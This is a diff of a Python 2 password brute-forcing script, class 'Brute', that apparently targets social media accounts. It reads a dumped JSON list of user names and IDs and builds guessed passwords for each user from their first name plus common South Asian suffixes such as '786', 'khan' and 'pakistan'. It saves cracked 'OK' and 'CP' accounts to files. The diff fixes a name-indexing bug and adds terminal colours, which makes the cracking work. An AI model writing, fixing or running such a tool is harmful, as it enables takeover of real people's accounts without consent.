@@ -75,7 +75,7 @@ class Brute:
 
 	def main(self):
 		while True:
-			file = raw_input('\nList id (ex: dump/xxx.json): ')
+			file = raw_input('\n\033[1;94mList id (\033[1;93mex: dump/xxx.json\033[1;94m): ')
 			try:
 				list = open(file, 'r').read()
 				object = json.loads(list)
@@ -88,8 +88,8 @@ class Brute:
 				obj = user['name'].split(' ')
 				if len(obj) == 1:
 					listpass = [
-						obj[1]+'123', obj[1]+'1234', obj[1]+'khan', 'pakistan', 'pakistan1', '786786',
-						obj[1]+'12345', obj[1]+'786', obj[1]+'87', 'pakistan786', 'pakistan123',
+						obj[0]+'123', obj[0]+'1234', obj[0]+'khan', 'pakistan', 'pakistan1', '786786',
+						obj[0]+'12345', obj[0]+'786', obj[0]+'87', 'pakistan786', 'pakistan123',
 					]
 				self.target.append({'id': user['uid'], 'pw': listpass})
 			except: pass
@@ -98,7 +98,7 @@ class Brute:
 		ask = raw_input('\033[1;93mUse password defaults OR manual? [D/m](recommended [D]):\033[1;90m ')
 		if ask.lower() == 'm':
 			while True:
-				print('\n\033[1;92mSet password use (,) for new password, EX: Zero,ZxXx-Angel,ZalasXa\n\033[0m')
+				print('\n\033[1;92mSet password use (,) for new password, EX: \033[1;90mpakistan,786786\n\033[0m')
 				self.setpw = raw_input('Set password: ').strip().split(',')
 				if self.setpw[0] != '':
 					break
@@ -111,10 +111,10 @@ class Brute:
 		if (len(self.ok) != 0):
 			print('\n\nOK: '+str(len(self.ok)))
 			for i in self.ok: print('\033[0;92m>>> ' +str(i)+'\033[0m')
-			print('Your OK results saved in: out/ok.txt')
+			print('\033[1;92mYour OK results saved in: \033[1;94mout\033[1;96m/\033[1;92mok.txt')
 		if (len(self.cp) != 0):
 			print('\n\nCP: '+str(len(self.cp)))
 			for i in self.cp: print('\033[0;93m>>> '+str(i)+'\033[0m')
-			print('Your CP results saved in: out/cp.txt')
+			print('\033[1;93mYour CP results saved in: \033[1;94mout\033[1;96m/\033[1;93mcp.txt')
 		if (len(self.cp) == 0 and len(self.ok) == 0):
 			print('\n\n\033[0;91mNo results found :(\033[0m')
